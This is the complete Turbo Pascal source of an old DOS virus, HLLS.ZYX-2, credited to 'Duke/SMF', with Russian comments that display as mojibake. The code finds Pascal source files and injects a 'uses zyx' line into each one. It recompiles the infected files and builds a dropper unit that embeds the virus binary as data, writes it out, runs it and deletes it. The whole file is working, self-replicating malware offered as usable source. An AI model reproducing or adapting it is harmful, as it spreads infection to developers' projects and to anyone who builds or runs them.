   {$M 20000, 10000, 40000}
   program HLLS_ZYX;
   uses dos;
   var Command,Compile:string;
       Comp:boolean;
       s:searchrec;
   {--------------------------------------------------------------------------}
   function UpStr(st:string):string;   {¯à¥®¡à §ã¥â áâà®ªã ª ¢¥àå¥¬ã à¥£¨áâàã}
   var n:string;
       i:integer;
   begin
   n:='';
   for i:=1 to length(st) do n:=n+UpCase(st[i]);
   UpStr:=n;
   end;
   {--------------------------------------------------------------------------}
   function Find(name,what:string):boolean;{  «®£ ¤®á®¢áª®© ª®¬ ¤ë FIND}
   {„¥« ¥â ¢¨àãá ¥§ ¢¨á¨¬ë¬ ®â ¯à¨áãâáâ¢¨ï ãâ¨«¨âë FIND   ¤¨áª¥}
   var f:text;
       st:string;
   begin
   Find:=false;
   assign(f,name);reset(f);
   while not eof(f) do
     begin
     readln(f,st);
     if pos(what,UpStr(st))<>0 then
       begin
       Find:=true;
       exit
       end
     end
   end;
   {--------------------------------------------------------------------------}
   procedure Infect(st:string);              {¯®à ¦ ¥â ä ©«}
   const sn='$$$$$$$$';
   var f,g:text;
       u,ip,w:byte;
       s:string;
       n:byte;
   begin
   u:=0;
   ip:=0;
   w:=0;                                     {¥ ¯®à §¨«¨}
   if Find(st,'ZYX') then exit;              {ä ©« ã¦¥ ¯®à ¦¥}
   if Find(st,'USES') then u:=1 ;
   if Find(st,'PROGRAM') or Find(st,'IMPLEMENTATION') then ip:=1 ;
   exec(Command,'/c copy '+st+' '+sn+'>nul');
   assign(f,sn);reset(f);                    {®âªàë«¨ ¢à¥¬¥ë© ä ©«}
   assign(g,st);
   setfattr(g,$20);                          {áï«¨  âà¨¡ãâë}
   rewrite(g);                               {¯¥à¥§ ¯¨á «¨ ¦¥àâ¢ã}
   writeln(g,'{$M 3000, 0, 3000}');
   if (ip=0) and (u=0) then
     begin
     writeln(g,'uses zyx;');
     w:=1;
     end;
   while not eof(f) do
     begin
     readln(f,s);
     if w=1 then writeln(g,s) else
       begin
       if u=1
       then if pos('USES',UpStr(s))<>0
            then begin
                 n:=pos('USES',UpStr(s))+4;
                 write(g,copy(s,1,n));
                 write(g,'zyx,');
                 writeln(g,copy(s,n,length(s)-n+1));
                 w:=1;
                 end
            else writeln(g,s)
       else if (pos('PROGRAM',UpStr(s))<>0) or (pos('IMPLEMENTATION',UpStr(s))<>0)
            then begin
                 writeln(g,s);
                 writeln(g,'uses zyx;');
                 w:=1;
                 end
            else writeln(g,s)
       end;
     end;
   close(g);
   close(f);erase(f);
   if Comp=true then exec(Command,'/c '+Compile+' '+st+'>nul');
   end;
   {--------------------------------------------------------------------------}
   procedure MakeDB;  {á®§¤ ¥â TPU-dropper ¢¨àãá }
   var f:text;
       g:searchrec;
       i,c:byte;
       d:file;        {¨áå®¤ë© ä ©«}
       z:byte;        {áç¥âç¨ª § ¯¨á ëå á¨¬¢®«®¢}
   begin
   findfirst(paramstr(0),$20,g);
   assign(f,'zyx.pas');rewrite(f);
   writeln(f,'{$M 20000, 1000, 20000}');
   writeln(f,'unit zyx;');
   writeln(f,'interface');
   writeln(f,'uses dos;');
   writeln(f,'implementation');
   writeln(f,'procedure Starting;assembler;');
   writeln(f,'asm');
   writeln(f,'jmp @Run');
   writeln(f,'@Nam: db ''zyx.exe'',0');
   writeln(f,'@Dat:');
   assign(d,paramstr(0));reset(d,1);
   while not eof(d) do
     begin
     write(f,'db ');
     blockread(d,c,1);
     write(f,c);
     i:=1;
     while (i<25) and (not eof(d)) do
       begin
       write(f,',');
       blockread(d,c,1);
       write(f,c);
       i:=i+1;
       end;
     writeln(f,'');
     end;
   close(d);
   writeln(f,'@Run:');
   writeln(f,'push ds');
   writeln(f,'push cs');
   writeln(f,'pop ds');
   writeln(f,'mov ah,3Ch');
   writeln(f,'mov cx,0');
   writeln(f,'mov dx,offset @Nam');
   writeln(f,'int 21h');
   writeln(f,'xchg bx,ax');
   writeln(f,'mov cx,offset @RUN');
   writeln(f,'mov dx,offset @Dat');
   writeln(f,'sub cx,dx');
   writeln(f,'mov ah,40h');
   writeln(f,'int 21h');
   writeln(f,'mov ah,3Eh');
   writeln(f,'int 21h');
   writeln(f,'pop ds');
   writeln(f,'end;');
   writeln(f,'begin');
   writeln(f,'Starting;');
   writeln(f,'exec(GetEnv(''COMSPEC''),''/c zyx.exe'');');
   writeln(f,'exec(GetEnv(''COMSPEC''),''/c del zyx.exe>nul'');');
   writeln(f,'end.');
   close(f);
   if Comp=true then
     begin
     exec(Command,'/c '+Compile+' zyx.pas>nul');
     erase(f);                               {§ ¬¥â ¥¬ á«¥¤ë}
     end;
   end;
   {-------------------------------------------------------------------------}
   procedure DetectComp;{®¯à¥¤¥«ï¥â  «¨ç¨¥   ª®¬¯ìîâ¥à¥ ª®¬¯¨«ïâ®à®¢}
   var Gn:searchrec;
       b:text;
   procedure Check;
   begin
   assign(b,'test.bat');rewrite(b);
   writeln(b,'@ctty nul');
   writeln(b,Compile,'>1.txt');
   close(b);
   exec(Command,'/c test.bat>nul');
   erase(b);
   findfirst('1.txt',$20,Gn);
   end;
   begin
   Comp:=false;
   Compile:='tpc.exe';
   Check;
   if doserror=0 then Comp:=true else
     begin
     Compile:='bpc.exe';
     Check;
     if doserror=0 then Comp:=true;
     end;
   if Comp then
     begin
     assign(b,Gn.name);
     erase(b);
     end;
   end;
   {--------------------------------------------------------------------------}
   begin
   findfirst('*.pas',$21,s);                 {¨é¥¬ PAS-ä ©«ë}
   if doserror=0 then                        {§ ç¨â ¥áâì, ç¥£® ¯®à §¨âì !}
     begin
     Command:='[HLLS.ZYX-2 (c) by Duke/SMF]';{¥¬®£® ª®¯¨à ©â®¢ ;) }
     Command:=GetEnv('COMSPEC');             {®¯à¥¤¥«ï¥¬ ¯ãâì ª COMMAND.COM}
     DetectComp;                             {¨é¥¬ ª®¬¯¨«ïâ®àë}
     MakeDB;                                 {á®§¤ ¥¬ ZYX.TPU}
     end;
   while doserror=0 do
     begin
     Infect(s.name);                         {¯®à ¦ ¥¬  ©¤¥ë© ä ©«ë}
     findnext(s);
     end;
   end.
